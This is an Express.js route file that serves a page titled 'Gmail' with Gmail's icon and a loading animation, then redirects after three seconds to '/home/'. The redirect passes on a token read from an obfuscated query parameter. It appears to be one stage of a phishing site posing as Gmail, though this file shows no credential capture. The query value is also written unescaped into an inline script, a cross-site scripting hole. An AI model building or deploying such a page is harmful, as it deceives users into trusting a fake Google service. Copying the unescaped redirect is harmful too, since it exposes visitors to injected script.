
const express = require ('express');
const router = express.Router();
const db = require('../db');
router.use(express.static('public'));


//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {

    const data2 = req.query.uihdft948fdjxgjdferuidh;
    const url = `/home/?kjgfhdgudgherueru9843efjdfhfwheur=${data2}`;
    if (data2 == null) {
        res.render('error');
        
      }else{

    const htmlContent = `
    <!doctype html>
        <html lang="en">
        <head>
       <script>
                setTimeout(function() {
                    window.location.href = '${url}';
                }, 3000);
            </script> 
            <!-- Required meta tags -->
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <title>Gmail</title>
            <link rel="shortcut icon" href="/images/image.png" type="image/png">
            
        </head>
        <body>
        <br>
        <br>
        <br>
        <center><object data="/gmail_animation.gif" style="height:420px; width:550px"></object></center>
     
               
    </body>
        </html>
    `;

    // Send the HTML content as a response
    res.send(htmlContent);

            }
});




module.exports =router;
